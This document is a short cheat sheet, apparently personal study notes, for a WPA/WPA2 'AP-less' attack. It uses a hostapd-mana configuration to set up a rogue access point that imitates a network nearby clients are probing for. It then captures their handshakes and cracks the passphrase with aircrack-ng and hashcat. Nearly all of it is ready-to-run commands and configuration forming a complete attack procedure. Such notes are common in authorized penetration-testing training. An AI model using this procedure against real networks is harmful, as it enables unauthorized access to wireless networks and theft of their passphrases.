# WPA&WPA2-APLess

Use when there is no AP but there are clients trying to connect to said AP

- Put interface to monitor mode
    - `sudo airmon-ng start wlan0`
- Scan for networks
    - `sudo airodump-ng wlan0mon -w <output-file>`
- Create AP based on Network Probe
    - `vi <filename>.conf`
        
        ```bash
        interface=wlan1
        driver=nl80211 #always the same
        hw_mode=g # depends on the hardware mode
        channel=1 
        ssid=<ssid_of_AP> # replace this
        mana_wpaout=<filename>.hccapx #output file
        wpa=3 # uses both wpa and wpa2
        wpa_key_mgmt=WPA-PSK / WPA-EAP
        wpa_pairwise=TKIP CCMP
        wpa_passphrase=asdasdasd123 # has to be at least 8 characters long
        ```
        
        can check [https://www.notion.so/Attack-Impt-60a45434bc37476f856db5950ea8dc19?pvs=4](Attack%20%5BImpt%5D%2060a45434bc37476f856db5950ea8dc19.md) this for the list of config to set if needed
        
- Start the AP with hostapd-mana
    - `sudo hostapd-mana <filename>.conf`
- Handshake should now be captured on airodump-ng screen
    - Can stop capturing once AP-STA-POSSIBLE-PSK-MISMATCH is shown

- Crack with Aircrack-ng
    - `sudo aircrack-ng <output_file>.cap -e <ESSID>`
    - `sudo aircrack-ng <output_file>.cap -e <ESSID> -w /usr/share/john/password.lst`
- Crack with hashcat
    - `sudo hashcat -a 0 -m 2500 <filename>.hccapx /usr/share/john/password.lst --force`
    
    ![Untitled](Untitled%2043.png)
    
- If 2500 doesn’t work, save hccapx to pcap file
    - `hcxhash2cap --hccapx=<input-file>.hccapx -c <output-file>.pcap`
- Export 22000 hash mode from pcap
    - `hcxpcapngtool <output-file>.pcap -o <output-file>.22000`
- Crack with new version of hashcat
    - `sudo hashcat -a 0 -m 22000 <filename>.22000 -w /usr/share/john/password.lst --force`